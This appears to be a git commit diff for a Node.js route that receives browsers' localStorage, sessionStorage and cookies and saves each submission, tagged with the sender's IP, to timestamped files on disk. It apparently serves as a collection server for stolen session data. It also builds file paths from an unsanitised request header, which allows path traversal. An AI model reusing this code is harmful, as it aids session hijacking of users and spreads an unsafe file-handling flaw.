3a7e2fc458d943871e55edc757399ba6326b9650
L1lith <lily@lillith.pw>
2018-07-15 16:02:03 -0600

    work on data storage

--- server/routes/storage.js
+++ server/routes/storage.js
@@ -1,4 +1,9 @@
 const {valid} = require('sandhands')
+const {writeFile} = require('fs')
+const {resolve, join} = require('path')
+const ensureExists = require('../../functions/ensureExists')
+
+const dataFolder = resolve(__dirname, '../data')
 
 const bodyFormat = {
   localStorage: {_:{}, strict: false},
@@ -12,7 +17,11 @@ function storage(request, reply) {
 
   const {localStorage, cookies, sessionStorage} = request.body
 
-  const output = {localStorage, cookies, sessionStorage}; // Required Semicolon
+  const ip = request.headers["X-Forwarded-For"]
+
+  if (!ip) return console.log(new Error('Missing X-Forwarded-For Header!'))
+
+  const output = {localStorage, cookies, sessionStorage, ip}; // Required Semicolon
 
   ["localStorage", "sessionStorage"].forEach(storageLocationName => {
     const storageLocation = output[storageLocationName]
@@ -32,11 +41,32 @@ function storage(request, reply) {
 
   if (cookies.length < 1) delete output.cookies
 
-  if (Object.keys(output).length < 1) return
+  if (Object.keys(output).length < 2) return
 
-  output.ip = request.headers["X-Forwarded-For"]
+  const date = new Date()
 
-  
+  const dateString = date.getDate() + "-" + (date.getMonth() + 1) + "-" + date.getFullYear() + " " + date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds()
+
+  const fileName = dateString + '.json'
+
+  const ipFolder = join(dataFolder, ip.replace(/\./g, '-'))
+
+  const storageFolder = join(ipFolder, '/storage')
+
+  ensureExists(ipFolder, err => {
+    if (err) return console.log(err)
+    ensureExists(storageFolder, err => {
+      if (err) return console.log(err)
+      try {
+        writeFile(storageFolder + '/' + fileName, JSON.stringify(output), err => {
+          if (err) console.log(err)
+        })
+      } catch(error) {
+        console.log(error)
+      }
+    })
+  })
+
 }
 
 module.exports = storage
